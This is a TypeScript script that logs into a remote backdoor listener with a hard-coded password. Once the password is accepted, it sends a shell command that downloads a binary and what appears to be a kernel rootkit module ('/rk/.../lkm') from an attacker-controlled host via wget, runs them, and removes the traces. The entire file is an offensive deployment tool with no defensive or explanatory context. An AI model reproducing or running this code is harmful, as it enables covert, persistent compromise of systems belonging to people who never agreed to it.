import * as net from 'net';

const { RHOST = '127.0.0.1', RPORT = '9001', LHOST = '10.13.1.79', LPORT = '1234' } = process.env;
const TIMEOUT = 5000;
const COMMAND = `cd $(mktemp -d) && wget -q ${LHOST}:${LPORT}/rk/4.15.0-91-generic/pkstdin -O pk && chmod +x pk && wget -q -O- $LHOST:$LPORT/rk/4.15.0-135-generic/lkm | ./pk; rm -f pk; echo DONE`

const doProd = (): Promise<void> => {
  return new Promise((resolve, reject) => {
    const sock = new net.Socket();
    const port = parseInt(RPORT, 10);

    const onError = (...args) => {
      sock.destroy();
      reject(new Error(`Socket error: ${RPORT}`));
    };

    sock.setTimeout(TIMEOUT);
    sock.once('error', onError);
    sock.once('timeout', onError);

    sock.connect(port, RHOST, () => {
      sock.on('data', (data) => {
        console.log(data.toString());

        if (/DONE/i.test(data.toString())) {
          sock.destroy();
          return resolve();
        }

        if (/correct password/i.test(data.toString())) {
          console.log('Password accepted.');
          sock.write(`${COMMAND}\n`, (err) => {
            if (err) {
              console.error('Error writing to socket:', err);
              sock.destroy();
              return reject(err);
            }
            console.log('Command sent successfully.');
          });
        }
      });

      sock.write('yourmom!\n', (err) => {
        if (err) {
          console.error('Error writing to socket:', err);
          sock.destroy();
          return reject(err);
        }
        console.log('Data sent successfully.');
      });

      // sock.end();
      // resolve();
    });
  });
}

const run = async () => {
  await doProd();
};

run();
